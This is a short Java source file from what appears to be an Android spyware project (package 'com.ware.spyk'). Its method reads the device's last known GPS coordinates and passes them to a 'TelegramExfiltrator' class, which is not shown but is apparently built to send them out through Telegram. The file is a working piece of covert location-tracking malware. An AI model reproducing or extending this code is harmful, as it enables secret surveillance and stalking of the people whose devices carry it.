package com.ware.spyk;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationManager;
import android.util.Log;

import androidx.core.app.ActivityCompat;

public class GetLocalisation {

    public static void captureOnce(Context context) {
        LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return;
        }

        Location lastLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
        if (lastLocation != null) {
            double lat = lastLocation.getLatitude();
            double lon = lastLocation.getLongitude();
            Log.d("GetLocalisation", "Localisation : " + lat + ", " + lon);
            TelegramExfiltrator.sendTexte("Localisation : " + lat + ", " + lon);
        }
    }
}
